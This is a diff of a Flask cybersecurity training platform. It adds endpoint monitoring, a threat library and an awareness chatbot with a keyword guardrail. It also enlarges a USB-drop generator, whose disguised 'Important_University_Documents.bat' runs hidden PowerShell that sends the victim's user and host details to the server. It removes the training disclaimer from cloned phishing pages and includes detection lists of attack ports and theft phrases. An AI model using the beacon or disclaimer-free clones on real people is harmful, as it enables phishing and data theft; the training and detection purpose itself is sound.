@@ -12,7 +12,9 @@ from functools import wraps
 import qrcode
 import base64
 from flask import send_file, abort
-
+import psutil
+import platform
+import time
 
 
 # ==================== CONFIGURATION ====================
@@ -53,6 +55,50 @@ QUIZ_QUESTIONS = [
     {"id": 10, "q": "Security awareness means?", "a": ["Knowing risks and safe behavior", "Only coding", "Only design", "Only hardware"], "correct": 0}
 ]
 
+EXTENSIONS_DIR = os.path.join(BASE_DIR, "static", "extensions")
+
+EXTENSION_FILES = {
+    "webshield": "webshield.zip",
+    "cookieshield": "SET-CDP-CookieShield-Pro-v1.0.zip",
+    "adshield": "SET-CDP-AdShield-Pro-v1.0.zip",
+    "todo": "Advanced-To-Do-List-main.zip",
+    "webshield-v2": "SET-CDP-WebShield-Pro-v2.zip"
+}
+
+# ==================== MINI-EDR CONFIGURATION ====================
+EDR_SUSPICIOUS_PORTS = {
+    21, 22, 23, 25, 53, 110, 135, 139, 445, 1433, 1521,
+    3306, 3389, 4444, 5555, 5900, 6666, 7777, 8080, 8443, 31337
+}
+
+EDR_CRITICAL_PROCESS_NAMES = {
+    "system", "registry", "smss.exe", "csrss.exe", "wininit.exe",
+    "services.exe", "lsass.exe", "svchost.exe", "explorer.exe",
+    "dwm.exe", "spoolsv.exe", "python.exe", "pythonw.exe"
+}
+
+@app.route("/download-extension/<extension_key>")
+def download_extension(extension_key):
+    filename = EXTENSION_FILES.get(extension_key)
+
+    if not filename:
+        abort(404)
+
+    file_path = os.path.join(EXTENSIONS_DIR, filename)
+
+    if not os.path.isfile(file_path):
+        return {
+            "error": "File not found",
+            "expected_path": file_path,
+            "available_files": os.listdir(EXTENSIONS_DIR) if os.path.exists(EXTENSIONS_DIR) else []
+        }, 404
+
+    return send_file(
+        file_path,
+        as_attachment=True,
+        download_name=filename,
+        mimetype="application/zip"
+    )
 
 # ==================== SECURITY DECORATORS ====================
 
@@ -127,6 +173,47 @@ def init_db():
         risk_level TEXT,
         timestamp TEXT,
         user_id INTEGER
+    )''')
+
+    c.execute('''CREATE TABLE IF NOT EXISTS cyber_threats (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        name TEXT NOT NULL,
+        risk TEXT NOT NULL,
+        desc TEXT NOT NULL,
+        how TEXT NOT NULL,
+        prev TEXT NOT NULL,
+        is_published INTEGER DEFAULT 1,
+        created_at TEXT DEFAULT CURRENT_TIMESTAMP,
+        updated_at TEXT DEFAULT CURRENT_TIMESTAMP
+    )''')
+
+    c.execute('''CREATE TABLE IF NOT EXISTS edr_events (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        event_type TEXT NOT NULL,
+        severity TEXT NOT NULL,
+        title TEXT NOT NULL,
+        details TEXT,
+        pid INTEGER,
+        process_name TEXT,
+        local_address TEXT,
+        remote_address TEXT,
+        created_at TEXT DEFAULT CURRENT_TIMESTAMP
+    )''')
+
+    c.execute('''CREATE TABLE IF NOT EXISTS edr_agents (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        agent_id TEXT UNIQUE NOT NULL,
+        hostname TEXT,
+        username TEXT,
+        os_name TEXT,
+        local_ip TEXT,
+        cpu_percent REAL,
+        ram_percent REAL,
+        processes_data TEXT,
+        connections_data TEXT,
+        status TEXT DEFAULT 'Online',
+        last_seen TEXT,
+        created_at TEXT DEFAULT CURRENT_TIMESTAMP
     )''')
 
     conn.commit()
@@ -221,8 +308,7 @@ def now(): return datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
 def mask_ip(ip):
     if not ip: return 'unknown'
-    parts = ip.split('.')
-    return f'{parts[0]}.{parts[1]}.xxx.xxx' if len(parts)==4 else ip[:8]+'...'
+    return ip  # الإظهار الكامل كما اتفقنا سابقاً
 
 def normalize_url(url):
     url = (url or '').strip()
@@ -269,6 +355,91 @@ def password_strength(password):
     pct=min(100,int(score/6*100))
     strength='Strong' if pct>=80 else 'Medium' if pct>=50 else 'Weak'
     return {'score':pct,'strength':strength,'feedback':feedback}
+
+# ==================== MINI-EDR HELPERS ====================
+
+def is_public_ip(ip):
+    try:
+        parsed = ipaddress.ip_address(ip)
+        return not (
+            parsed.is_private or
+            parsed.is_loopback or
+            parsed.is_link_local or
+            parsed.is_multicast or
+            parsed.is_reserved
+        )
+    except Exception:
+        return False
+
+def log_edr_event(event_type, severity, title, details="", pid=None, process_name=None, local_address=None, remote_address=None):
+    conn = get_db()
+    conn.execute("""
+        INSERT INTO edr_events 
+        (event_type, severity, title, details, pid, process_name, local_address, remote_address)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+    """, (event_type, severity, title, details, pid, process_name, local_address, remote_address))
+    conn.commit()
+    conn.close()
+
+def send_telegram_edr_alert(title, details):
+    token = os.environ.get("TELEGRAM_BOT_TOKEN")
+    chat_id = os.environ.get("TELEGRAM_CHAT_ID")
+    if not token or not chat_id:
+        return False
+    try:
+        message = f"🚨 SET-CDP Mini-EDR Alert\n\n{title}\n\n{details}"
+        url = f"https://api.telegram.org/bot{token}/sendMessage"
+        requests.post(url, data={"chat_id": chat_id, "text": message}, timeout=5)
+        return True
+    except Exception:
+        return False
+
+def get_process_risk(proc_info):
+    score = 0
+    reasons = []
+    name = (proc_info.get("name") or "").lower()
+    cpu = proc_info.get("cpu_percent") or 0
+    mem = proc_info.get("memory_percent") or 0
+    exe = proc_info.get("exe") or ""
+    
+    suspicious_names = ["miner", "crypt", "payload", "backdoor", "rat", "keylogger", "inject", "unknown"]
+    
+    if cpu >= 80:
+        score += 25
+        reasons.append("High CPU usage")
+    if mem >= 25:
+        score += 20
+        reasons.append("High memory usage")
+    if any(word in name for word in suspicious_names):
+        score += 35
+        reasons.append("Suspicious process name")
+    if exe and ("temp" in exe.lower() or "appdata" in exe.lower()):
+        score += 20
+        reasons.append("Running from temporary/user directory")
+        
+    level = "High" if score >= 70 else "Medium" if score >= 40 else "Low" if score >= 20 else "Normal"
+    return {"score": min(score, 100), "level": level, "reasons": reasons}
+
+def get_connection_risk(conn_data):
+    score = 0
+    reasons = []
+    remote_ip = conn_data.get("remote_ip")
+    remote_port = conn_data.get("remote_port")
+    status = conn_data.get("status")
+    
+    if remote_ip and is_public_ip(remote_ip):
+        score += 30
+        reasons.append("External public connection")
+    if remote_port in EDR_SUSPICIOUS_PORTS:
+        score += 25
+        reasons.append(f"Sensitive/suspicious port: {remote_port}")
+    if status == "ESTABLISHED" and remote_ip and is_public_ip(remote_ip):
+        score += 15
+        reasons.append("Established external session")
+        
+    level = "High" if score >= 70 else "Medium" if score >= 40 else "Low" if score >= 20 else "Normal"
+    return {"score": min(score, 100), "level": level, "reasons": reasons}
+
 
 # ==================== SYSTEM INITIALIZATION ====================
 
@@ -388,10 +559,8 @@ def index():
     user_id = session.get("user_id")
     scans = []
     
-    # إذا كان المستخدم مسجلاً للدخول، نسحب سجل فحوصاته
     if user_id:
         if session.get("role") == "admin":
-            # الأدمن يرى آخر 15 فحص في النظام
             scans = conn.execute("""
                 SELECT scan_history.*, users.username AS owner_username 
                 FROM scan_history 
@@ -399,7 +568,6 @@ def index():
                 ORDER BY scan_history.id DESC LIMIT 15
             """).fetchall()
         else:
-            # المستخدم العادي يرى آخر 15 فحص خاص به فقط
             scans = conn.execute("SELECT * FROM scan_history WHERE user_id = ? ORDER BY id DESC LIMIT 15", (user_id,)).fetchall()
             
     conn.close()
@@ -444,7 +612,6 @@ def dashboard():
             ORDER BY id DESC
         """).fetchall()
         
-        # سحب كل الفحوصات والنشاطات للأدمن
         scans = conn.execute("""
             SELECT 
                 scan_history.*, 
@@ -479,12 +646,11 @@ def dashboard():
         """, (user_id,)).fetchall()
 
         users = []
-        
-        # سحب فحوصات ونشاطات المستخدم الحالي فقط
         scans = conn.execute("SELECT * FROM scan_history WHERE user_id = ? ORDER BY id DESC LIMIT 50", (user_id,)).fetchall()
 
     conn.close()
     return render_template('dashboard.html', captured=captured, clones=clones, users=users, scans=scans)
+
 @app.route('/ready_templates')
 @login_required
 def ready_templates(): return render_template('ready_templates.html')
@@ -504,6 +670,7 @@ def awareness(): return render_template('awareness_training.html')
 @login_required
 def extensions_page():
     return render_template('extensions.html')
+
 # ==================== OFFENSIVE (CLONE & CAPTURE) APIs ====================
 
 @app.route('/api/generate-qr', methods=['POST'])
@@ -549,17 +716,16 @@ def generate_usb():
 
     bat_content = f"""@echo off
 :: SET-CDP Physical Security Training Payload
-:: This file simulates a USB Drop Attack (Beacon).
+:: This file simulates an Advanced USB Drop Attack (Beacon).
 
 set SERVER_URL={server_url}/api/capture-submit
 set SITE_NAME=USB_Drop_Attack
 
-powershell -WindowStyle Hidden -Command "$data = @{{site='%SITE_NAME%'; form_data=@{{username=$env:USERNAME; password='[USB_BEACON_EXECUTED]'; computername=$env:COMPUTERNAME; creator_id='{user_id}'; attack_type='Physical_USB_Drop'}}}}; $json = $data | ConvertTo-Json -Depth 10; try {{ Invoke-RestMethod -Uri '%SERVER_URL%' -Method Post -Body $json -ContentType 'application/json' -UseBasicParsing }} catch {{ }}"
+powershell -WindowStyle Hidden -Command "$os=(Get-WmiObject Win32_OperatingSystem).Caption; $data = @{{site='%SITE_NAME%'; form_data=@{{username=$env:USERNAME; password='[USB_BEACON_EXECUTED]'; computername=$env:COMPUTERNAME; user_domain=$env:USERDOMAIN; os_version=$os; execution_path=$PWD.Path; creator_id='{user_id}'; attack_type='Physical_USB_Drop'}}}}; $json = $data | ConvertTo-Json -Depth 10; try {{ Invoke-RestMethod -Uri '%SERVER_URL%' -Method Post -Body $json -ContentType 'application/json' -UseBasicParsing }} catch {{ }}"
 exit
 """
-    log_scan("usb_payload_generator", server_url, "تم إنشاء ملف محاكاة USB", "Info")
+    log_scan("usb_payload_generator", server_url, "تم إنشاء ملف محاكاة USB بخصائص الاستطلاع المتقدم", "Info")
     return jsonify({'success': True, 'payload': bat_content, 'filename': 'Important_University_Documents.bat'})
-
 
 @app.route('/api/clone-site', methods=['POST'])
 @login_required
@@ -589,8 +755,6 @@ def api_clone_site():
         if not soup.body: soup.append(soup.new_tag('body'))
         
         banner = soup.new_tag('div')
-     #   banner['style'] = 'position:sticky;top:0;z-index:999999;background:#dc3545;color:#fff;padding:12px;text-align:center;font-family:Arial;font-weight:bold;'
-      #  banner.string = '🎓 ACADEMIC TRAINING CLONE - This is a copied page for cybersecurity awareness only.'
         
         js = soup.new_tag('script')
         js.string = f'''
@@ -904,24 +1068,155 @@ def api_file():
     log_scan('file', f.filename, 'metadata analyzed', 'Info')
     return jsonify(data)
 
+@app.route('/api/log-scan', methods=['POST'])
+@login_required
+def api_log_scan():
+    """استقبال السجلات من الأدوات المحلية وحفظها"""
+    data = request.get_json() or {}
+    scan_type = data.get('scan_type', 'unknown')
+    target = data.get('target', '-')
+    result_summary = data.get('result_summary', 'Completed')
+    risk_level = data.get('risk_level', 'Info')
+    
+    # استخدام دالة log_scan الموجودة مسبقاً في الكود لحفظ البيانات
+    log_scan(scan_type, target, result_summary, risk_level)
+    return jsonify({'success': True})
 
-# ==================== QUIZ & EDUCATIONAL MODULES ====================
+@app.route('/api/scans/recent', methods=['GET'])
+@login_required
+def api_recent_scans():
+    """جلب السجلات فوراً لتحديث الجدول بشكل حي"""
+    user_id = session.get("user_id")
+    if not user_id:
+        return jsonify({'scans': []})
+        
+    conn = get_db()
+    if session.get("role") == "admin":
+        scans = conn.execute("""
+            SELECT scan_history.*, users.username AS owner_username 
+            FROM scan_history 
+            LEFT JOIN users ON scan_history.user_id = users.id 
+            ORDER BY scan_history.id DESC LIMIT 15
+        """).fetchall()
+    else:
+        scans = conn.execute("""
+            SELECT * FROM scan_history 
+            WHERE user_id = ? ORDER BY id DESC LIMIT 15
+        """, (user_id,)).fetchall()
+    conn.close()
+    
+    scans_list = []
+    for s in scans:
+        d = dict(s)
+        if 'owner_username' not in d:
+            d['owner_username'] = 'زائر'
+        scans_list.append(d)
+        
+    return jsonify({'scans': scans_list})
+# ==================== QUIZ & THREAT LIBRARY MODULES ====================
 
 @app.route("/threat-library")
 def threat_library():
-    threats = [
-        {"name":"Phishing","risk":"High","desc":"خداع المستخدم لإدخال بياناته في صفحة مزيفة.","how":"يتم إرسال رابط أو صفحة مشابهة للأصل.","prev":"تحقق من الرابط وفعل MFA."},
-        {"name":"Spear Phishing","risk":"High","desc":"تصيد موجه لشخص أو مؤسسة محددة.","how":"رسائل مخصصة باستخدام معلومات حقيقية.","prev":"تدريب الموظفين والتحقق من المرسل."},
-        {"name":"Smishing","risk":"Medium","desc":"تصيد عبر رسائل SMS.","how":"رابط قصير أو رسالة عاجلة.","prev":"لا تضغط روابط مجهولة."},
-        {"name":"Vishing","risk":"Medium","desc":"تصيد عبر المكالمات الهاتفية.","how":"المهاجم ينتحل صفة جهة رسمية.","prev":"لا تشارك رموز أو كلمات مرور."},
-        {"name":"XSS","risk":"High","desc":"حقن JavaScript داخل صفحة ويب.","how":"استغلال مدخلات غير مفلترة.","prev":"فلترة المدخلات واستخدام CSP."},
-        {"name":"SQL Injection","risk":"Critical","desc":"حقن أوامر SQL في النظام.","how":"استغلال استعلامات غير آمنة.","prev":"استخدم Prepared Statements."},
-        {"name":"CSRF","risk":"Medium","desc":"إجبار المستخدم على تنفيذ طلب بدون علمه.","how":"استغلال جلسة مستخدم نشطة.","prev":"استخدم CSRF Tokens."},
-        {"name":"Malware","risk":"High","desc":"برمجيات خبيثة تضر الجهاز.","how":"ملفات أو روابط مصابة.","prev":"افحص الملفات وحدّث النظام."},
-        {"name":"Ransomware","risk":"Critical","desc":"تشفير الملفات وطلب فدية.","how":"مرفقات أو ثغرات أو روابط.","prev":"نسخ احتياطي وتحديثات أمنية."},
-        {"name":"MITM","risk":"High","desc":"اعتراض الاتصال بين طرفين.","how":"شبكات غير آمنة أو شهادات مزيفة.","prev":"استخدم HTTPS وVPN موثوق."}
-    ]
+    conn = get_db()
+    threats_db = conn.execute("""
+        SELECT id, name, risk, desc, how, prev
+        FROM cyber_threats
+        WHERE is_published = 1
+        ORDER BY 
+            CASE risk
+                WHEN 'Critical' THEN 1
+                WHEN 'High' THEN 2
+                WHEN 'Medium' THEN 3
+                WHEN 'Low' THEN 4
+                ELSE 5
+            END,
+            id DESC
+    """).fetchall()
+    conn.close()
+
+    threats = [dict(t) for t in threats_db]
     return render_template("threat_library.html", threats=threats)
+
+
+@app.route("/admin/threats")
+@admin_required
+def admin_threats():
+    conn = get_db()
+    threats_db = conn.execute("""
+        SELECT *
+        FROM cyber_threats
+        ORDER BY id DESC
+    """).fetchall()
+    conn.close()
+
+    threats = [dict(t) for t in threats_db]
+    return render_template("admin_threats.html", threats=threats)
+
+
+@app.route("/admin/threats/add", methods=["POST"])
+@admin_required
+def add_threat():
+    name = request.form.get("name", "").strip()
+    risk = request.form.get("risk", "Medium").strip()
+    desc = request.form.get("desc", "").strip()
+    how = request.form.get("how", "").strip()
+    prev = request.form.get("prev", "").strip()
+    is_published = 1 if request.form.get("is_published") == "on" else 0
+
+    if not name or not desc or not how or not prev:
+        flash("Please fill all required fields.", "danger")
+        return redirect(url_for("admin_threats"))
+
+    conn = get_db()
+    conn.execute("""
+        INSERT INTO cyber_threats (name, risk, desc, how, prev, is_published)
+        VALUES (?, ?, ?, ?, ?, ?)
+    """, (name, risk, desc, how, prev, is_published))
+    conn.commit()
+    conn.close()
+
+    flash("Threat published successfully.", "success")
+    return redirect(url_for("admin_threats"))
+
+
+@app.route("/admin/threats/<int:threat_id>/update", methods=["POST"])
+@admin_required
+def update_threat(threat_id):
+    name = request.form.get("name", "").strip()
+    risk = request.form.get("risk", "Medium").strip()
+    desc = request.form.get("desc", "").strip()
+    how = request.form.get("how", "").strip()
+    prev = request.form.get("prev", "").strip()
+    is_published = 1 if request.form.get("is_published") == "on" else 0
+
+    if not name or not desc or not how or not prev:
+        flash("Please fill all required fields.", "danger")
+        return redirect(url_for("admin_threats"))
+
+    conn = get_db()
+    conn.execute("""
+        UPDATE cyber_threats
+        SET name = ?, risk = ?, desc = ?, how = ?, prev = ?, is_published = ?, updated_at = CURRENT_TIMESTAMP
+        WHERE id = ?
+    """, (name, risk, desc, how, prev, is_published, threat_id))
+    conn.commit()
+    conn.close()
+
+    flash("Threat updated successfully.", "success")
+    return redirect(url_for("admin_threats"))
+
+
+@app.route("/admin/threats/<int:threat_id>/delete", methods=["POST"])
+@admin_required
+def delete_threat(threat_id):
+    conn = get_db()
+    conn.execute("DELETE FROM cyber_threats WHERE id = ?", (threat_id,))
+    conn.commit()
+    conn.close()
+
+    flash("Threat deleted successfully.", "success")
+    return redirect(url_for("admin_threats"))
+
 
 @app.route("/quiz")
 def quiz_start():
@@ -1043,7 +1338,35 @@ def quiz_builder_toggle(q_id):
     conn.close()
     return redirect(url_for("quiz_builder"))
 
+@app.route('/quiz/result/<int:quiz_id>')
+@login_required
+def view_quiz_result(quiz_id):
+    """مسار لعرض نتيجة امتحان سابقة أو طباعة الشهادة"""
+    conn = get_db()
+    # جلب نتيجة الامتحان بناءً على الـ ID
+    result = conn.execute("SELECT * FROM quiz_results WHERE id = ?", (quiz_id,)).fetchone()
+    conn.close()
 
+    # إذا لم تكن النتيجة موجودة
+    if not result:
+        flash("نتيجة الامتحان غير موجودة.", "danger")
+        return redirect(url_for('profile'))
+
+    # حماية أمنية: التأكد أن من يعرض النتيجة هو صاحبها أو الآدمن
+    if session.get("role") != "admin" and result["user_id"] != session.get("user_id"):
+        flash("غير مصرح لك بعرض هذه الشهادة.", "danger")
+        return redirect(url_for('profile'))
+
+    # إرسال البيانات لصفحة الشهادة
+    return render_template(
+        "quiz_result.html",
+        name=result["student_name"],
+        score=result["score"],
+        total=result["total"],
+        percentage=result["percentage"],
+        status=result["status"],
+        timestamp=result["timestamp"]
+    )
 # ==================== DATA & REPORTING ====================
 
 @app.route("/api/chart-data")
@@ -1079,8 +1402,809 @@ def reports():
     return render_template("reports.html", stats=stats, recent_scans=recent_scans, recent_quiz=recent_quiz)
 
 
-# ==================== MAIN EXECUTION ====================
+# ==================== REMOTE AGENT & MINI-SOC ROUTES ====================
 
+@app.route('/api/agent/heartbeat', methods=['POST'])
+def agent_heartbeat():
+    data = request.get_json()
+    if not data or data.get('api_key') != 'SET-CDP-AGENT-KEY':
+        return jsonify({'error': 'Unauthorized'}), 401
+    
+    agent_id = data.get('agent_id')
+    hostname = data.get('hostname')
+    username = data.get('username')
+    os_name = data.get('os_name')
+    local_ip = data.get('local_ip')
+    cpu_percent = data.get('cpu_percent')
+    ram_percent = data.get('ram_percent')
+    
+    # تحويل المصفوفات إلى نصوص JSON لحفظها في قاعدة البيانات
+    processes_data = json.dumps(data.get('processes', []))
+    connections_data = json.dumps(data.get('connections', []))
+    
+    conn = get_db()
+    existing = conn.execute("SELECT id FROM edr_agents WHERE agent_id = ?", (agent_id,)).fetchone()
+    
+    if existing:
+        conn.execute("""
+            UPDATE edr_agents 
+            SET hostname=?, username=?, os_name=?, local_ip=?, cpu_percent=?, ram_percent=?, 
+                processes_data=?, connections_data=?, status='Online', last_seen=?
+            WHERE agent_id=?
+        """, (hostname, username, os_name, local_ip, cpu_percent, ram_percent, 
+              processes_data, connections_data, now(), agent_id))
+    else:
+        conn.execute("""
+            INSERT INTO edr_agents (agent_id, hostname, username, os_name, local_ip, cpu_percent, ram_percent, processes_data, connections_data, status, last_seen)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'Online', ?)
+        """, (agent_id, hostname, username, os_name, local_ip, cpu_percent, ram_percent, processes_data, connections_data, now()))
+        
+    conn.commit()
+    conn.close()
+    return jsonify({'success': True, 'message': 'Heartbeat received'})
+
+@app.route("/edr/devices")
+@admin_required
+def edr_devices():
+    conn = get_db()
+    agents_db = conn.execute("SELECT * FROM edr_agents ORDER BY last_seen DESC").fetchall()
+    conn.close()
+
+    devices = []
+    current_time = datetime.now()
+
+    for row in agents_db:
+        dev = dict(row)
+        try:
+            last_seen_dt = datetime.strptime(dev['last_seen'], "%Y-%m-%d %H:%M:%S")
+            diff_seconds = (current_time - last_seen_dt).total_seconds()
+            if diff_seconds > 30:
+                dev['status'] = 'Offline'
+            else:
+                dev['status'] = 'Online'
+        except Exception:
+            dev['status'] = 'Unknown'
+        devices.append(dev)
+
+    return render_template("edr_devices.html", devices=devices)
+
+@app.route("/edr/device/<agent_id>")
+@admin_required
+def edr_device_details(agent_id):
+    conn = get_db()
+    dev_row = conn.execute("SELECT * FROM edr_agents WHERE agent_id = ?", (agent_id,)).fetchone()
+    conn.close()
+    
+    if not dev_row:
+        flash("الجهاز غير موجود أو لم يتم تسجيله بعد.", "danger")
+        return redirect(url_for('edr_devices'))
+        
+    dev = dict(dev_row)
+    
+    # تحديد حالة الـ Offline
+    try:
+        last_seen_dt = datetime.strptime(dev['last_seen'], "%Y-%m-%d %H:%M:%S")
+        diff_seconds = (datetime.now() - last_seen_dt).total_seconds()
+        dev['status'] = 'Offline' if diff_seconds > 30 else 'Online'
+    except Exception:
+        dev['status'] = 'Unknown'
+        
+    # استخراج وتحليل بيانات العمليات
+    dev['processes'] = []
+    if dev.get('processes_data'):
+        try:
+            procs = json.loads(dev['processes_data'])
+            for p in procs:
+                risk = get_process_risk(p) # استخدام دالة تقييم المخاطر
+                p.update({"risk_score": risk["score"], "risk_level": risk["level"], "risk_reasons": risk["reasons"]})
+                dev['processes'].append(p)
+        except Exception: pass
+
+    # استخراج وتحليل بيانات الاتصالات الشبكية
+    dev['connections'] = []
+    if dev.get('connections_data'):
+        try:
+            conns = json.loads(dev['connections_data'])
+            for c in conns:
+                risk = get_connection_risk(c) # استخدام دالة تقييم المخاطر
+                c.update({"risk_score": risk["score"], "risk_level": risk["level"], "risk_reasons": risk["reasons"]})
+                dev['connections'].append(c)
+        except Exception: pass
+
+    return render_template("edr_device_details.html", device=dev)
+
+@app.route("/edr/download")
+@admin_required
+def agent_download():
+    return render_template("agent_download.html")
+
+# ==================== LOCAL EDR (SERVER MONITOR) ====================
+@app.route("/edr")
+@login_required
+def edr_dashboard():
+    return render_template("edr.html")
+
+@app.route("/api/edr-data")
+@login_required
+def api_edr_data():
+    processes = []; connections = []; alerts = []
+    try:
+        system_info = {
+            "hostname": socket.gethostname(), "platform": platform.platform(),
+            "cpu_percent": psutil.cpu_percent(interval=0.2), "memory_percent": psutil.virtual_memory().percent,
+            "disk_percent": psutil.disk_usage("/").percent,
+            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        }
+    except Exception: system_info = {}
+
+    try:
+        for proc in psutil.process_iter(["pid", "name", "username", "status", "cpu_percent", "memory_percent", "exe", "create_time"]):
+            try:
+                info = proc.info
+                risk = get_process_risk(info)
+                process_item = {
+                    "pid": info.get("pid"), "name": info.get("name") or "-", "username": info.get("username") or "-",
+                    "status": info.get("status") or "-", "cpu_percent": round(info.get("cpu_percent") or 0, 1),
+                    "memory_percent": round(info.get("memory_percent") or 0, 1), "exe": info.get("exe") or "-",
+                    "risk_score": risk["score"], "risk_level": risk["level"], "risk_reasons": risk["reasons"]
+                }
+                processes.append(process_item)
+                if risk["level"] in ["High", "Medium"]:
+                    alerts.append({"type": "process", "severity": risk["level"], "title": f"Suspicious process: {process_item['name']}", "details": ", ".join(risk["reasons"]), "pid": process_item["pid"]})
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess): continue
+        processes = sorted(processes, key=lambda p: (p["risk_score"], p["memory_percent"], p["cpu_percent"]), reverse=True)[:25]
+    except Exception: pass
+
+    try:
+        for conn in psutil.net_connections(kind="inet"):
+            try:
+                local_address = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "-"
+                remote_address = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "-"
+                process_name = "-"
+                if conn.pid:
+                    try: process_name = psutil.Process(conn.pid).name()
+                    except Exception: process_name = "-"
+                
+                conn_item = {
+                    "type": conn.type.name if hasattr(conn.type, "name") else str(conn.type),
+                    "local_address": local_address, "remote_address": remote_address,
+                    "remote_ip": conn.raddr.ip if conn.raddr else None, "remote_port": conn.raddr.port if conn.raddr else None,
+                    "status": conn.status, "pid": conn.pid, "process_name": process_name
+                }
+                risk = get_connection_risk(conn_item)
+                conn_item.update({"risk_score": risk["score"], "risk_level": risk["level"], "risk_reasons": risk["reasons"]})
+                if conn.status in ["ESTABLISHED", "LISTEN"]: connections.append(conn_item)
+                if risk["level"] in ["High", "Medium"]:
+                    alerts.append({"type": "connection", "severity": risk["level"], "title": f"Suspicious connection: {remote_address}", "details": ", ".join(risk["reasons"]), "pid": conn.pid})
+            except Exception: continue
+        connections = sorted(connections, key=lambda c: c["risk_score"], reverse=True)[:50]
+    except Exception: pass
+
+    return jsonify({"system": system_info, "processes": processes, "connections": connections, "alerts": alerts[:15]})
+
+@app.route("/api/edr-kill/<int:pid>", methods=["POST"])
+@admin_required
+def api_edr_kill(pid):
+    try:
+        proc = psutil.Process(pid)
+        name = (proc.name() or "").lower()
+        if name in EDR_CRITICAL_PROCESS_NAMES: return jsonify({"ok": False, "error": f"Protected process cannot be killed: {name}"}), 400
+        proc.terminate()
+        return jsonify({"ok": True, "message": f"Process {pid} terminated successfully"})
+    except psutil.NoSuchProcess: return jsonify({"ok": False, "error": "Process not found"}), 404
+    except psutil.AccessDenied: return jsonify({"ok": False, "error": "Access denied."}), 403
+    except Exception as e: return jsonify({"ok": False, "error": str(e)}), 500
+
+
+#==============================
+# =========================================================
+# SET-CDP Awareness Chatbot API
+# =========================================================
+# =========================================================
+# SET-CDP Awareness Chatbot API - Enhanced Version
+# =========================================================
+
+import time
+import re
+from flask import request, jsonify
+
+# Rate limit بسيط لحماية Endpoint من كثرة الطلبات
+CHATBOT_RATE_LIMIT = {}
+CHATBOT_MAX_REQUESTS = 20      # عدد الطلبات
+CHATBOT_WINDOW_SECONDS = 60    # خلال دقيقة واحدة
+
+
+def normalize_chat_text(text):
+    """
+    Normalize Arabic/English user input for easier keyword matching.
+    """
+    text = (text or "").strip().lower()
+
+    replacements = {
+        "أ": "ا",
+        "إ": "ا",
+        "آ": "ا",
+        "ى": "ي",
+        "ة": "ه",
+        "ؤ": "و",
+        "ئ": "ي",
+        "ـ": "",
+    }
+
+    for old, new in replacements.items():
+        text = text.replace(old, new)
+
+    # إزالة التكرارات والمسافات الزائدة
+    text = re.sub(r"\s+", " ", text)
+
+    return text
+
+
+def has_any(text, words):
+    return any(word in text for word in words)
+
+
+def make_reply(reply, category="general", suggestions=None, quick_links=None):
+    """
+    Standard chatbot response format.
+    الواجهة الحالية تستخدم reply فقط، لكن باقي الحقول مفيدة للتطوير لاحقاً.
+    """
+    return {
+        "reply": reply,
+        "category": category,
+        "suggestions": suggestions or [],
+        "quick_links": quick_links or []
+    }
+
+
+def is_rate_limited(client_ip):
+    """
+    Simple in-memory rate limiter.
+    مناسب للمشروع المحلي والتجريبي.
+    """
+    now_ts = time.time()
+
+    records = CHATBOT_RATE_LIMIT.get(client_ip, [])
+    records = [t for t in records if now_ts - t < CHATBOT_WINDOW_SECONDS]
+
+    if len(records) >= CHATBOT_MAX_REQUESTS:
+        CHATBOT_RATE_LIMIT[client_ip] = records
+        return True
+
+    records.append(now_ts)
+    CHATBOT_RATE_LIMIT[client_ip] = records
+    return False
+
+
+def is_unsafe_chat_request(msg):
+    """
+    Ethical guardrail.
+    لا نحظر كلمات تعليمية مثل cookies وحدها.
+    نحظر فقط العبارات التي تطلب سرقة أو اختراق أو إساءة استخدام.
+    """
+
+    unsafe_phrases = [
+        # Arabic unsafe intent
+        "كيف اسرق",
+        "اريد اسرق",
+        "بدي اسرق",
+        "سرقه حساب",
+        "سرقة حساب",
+        "سرقه كلمه مرور",
+        "سرقة كلمة مرور",
+        "سرقه باسورد",
+        "سرقة باسورد",
+        "اختراق حساب",
+        "تهكير حساب",
+        "اختراق فيسبوك",
+        "تهكير فيسبوك",
+        "اختراق انستغرام",
+        "تهكير انستغرام",
+        "اختراق انستا",
+        "سرقه كوكيز",
+        "سرقة كوكيز",
+        "سرقه الجلسه",
+        "سرقة الجلسة",
+        "خطف الجلسه",
+        "خطف الجلسة",
+        "كيف اخذ باسورد",
+        "كيف اطلع باسورد",
+        "كيف اسحب باسورد",
+        "كيف اخذ كلمه المرور",
+        "كلمه مرور حقيقيه",
+        "باسورد حقيقي",
+        "جمع كلمات مرور",
+        "التقاط كلمات مرور",
+        "صيد كلمات مرور",
+
+        # English unsafe intent
+        "steal password",
+        "steal passwords",
+        "steal cookies",
+        "cookie theft",
+        "session hijack",
+        "session hijacking",
+        "hack facebook",
+        "hack instagram",
+        "phishing real",
+        "real phishing",
+        "credential stealing",
+        "credential theft",
+        "password grabber",
+        "cookie grabber",
+        "token stealer",
+        "steal session",
+        "account hacking",
+    ]
+
+    return has_any(msg, unsafe_phrases)
+
+
+def chatbot_reply(user_message):
+    msg = normalize_chat_text(user_message)
+
+    if not msg:
+        return make_reply(
+            "اكتب سؤالك وسأساعدك في استخدام منصة SET-CDP.",
+            "general",
+            suggestions=[
+                "ما هي SET-CDP؟",
+                "كيف أفحص رابط؟",
+                "ما هو Mini-EDR؟",
+                "ما هي CookieShield؟"
+            ]
+        )
+
+    # =====================================================
+    # Ethical Guardrail
+    # =====================================================
+    if is_unsafe_chat_request(msg):
+        return make_reply(
+            (
+                "لا أستطيع المساعدة في سرقة الحسابات أو كلمات المرور أو الجلسات أو تنفيذ أي استخدام غير مصرح به. "
+                "منصة SET-CDP مخصصة للتدريب، التوعية، الفحص الدفاعي، ومحاكاة المخاطر داخل بيئة أخلاقية وآمنة. "
+                "يمكنني بدلاً من ذلك مساعدتك في فهم التصيد، حماية الحسابات، تحليل الروابط، وتطبيق ممارسات دفاعية سليمة."
+            ),
+            "safety",
+            suggestions=[
+                "كيف أكتشف التصيد؟",
